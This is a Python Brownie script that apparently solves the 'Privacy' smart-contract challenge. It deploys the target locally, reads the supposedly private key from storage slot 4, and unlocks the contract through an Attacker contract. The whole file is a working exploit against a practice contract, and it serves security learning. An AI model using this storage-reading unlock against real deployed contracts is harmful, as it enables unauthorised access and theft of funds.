from brownie import *
from .reports import *
from web3 import Web3
import binascii


a0 = accounts[0] # target deployer
a1 = accounts[1] # attacker account
BIGNUMBER = (10**18)

REPORT = Report()
REPORT.add_account(a0, 'Target deployer')
REPORT.add_account(a1, 'Attacker')

def main():
    target = prepare()
    attack(target)

def prepare():
    # deploy smart contract
    password = 'some_complicated_password'
    key = [
    Web3.toBytes(text='lala'),
    Web3.toBytes(text='bobo'),
    Web3.toBytes(text='nunu')
    ]
    target = Privacy.deploy(key,{'from': a0})

    # attacker should start with little ETH balance
    balance_to_burn = a1.balance() - 1*BIGNUMBER
    burn_address = accounts[3]
    a1.transfer(burn_address,balance_to_burn)

    REPORT.print()
    REPORT.txt_print('PRE-ATTACK STATE IS READY')
    return target

def attack(target):

    # read target's storage and unlock
    key32 = web3.eth.get_storage_at(target.address,4)
    attacker = Attacker.deploy(target,{'from':a1})
    attacker.attack(key32,{'from':a1})
    
    if target.locked() == False:
        REPORT.txt_print('ATTACK SUCCESSFUL')
    else:
        REPORT.txt_print('ATTACK IS NOT SUCCESSFUL')
